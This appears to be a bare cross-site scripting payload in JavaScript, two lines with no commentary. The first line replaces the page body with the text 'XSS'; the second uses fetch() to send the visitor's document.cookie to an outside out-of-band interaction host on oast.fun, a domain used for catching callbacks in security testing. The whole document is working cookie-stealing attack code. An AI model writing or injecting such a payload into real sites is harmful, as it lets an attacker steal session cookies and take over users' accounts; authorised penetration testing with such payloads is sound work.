document.body.innerHTML = "XSS";
fetch("https://kkcdomdzjmvjbmvynfmmryidn3eiu196p.oast.fun" + document.cookie);
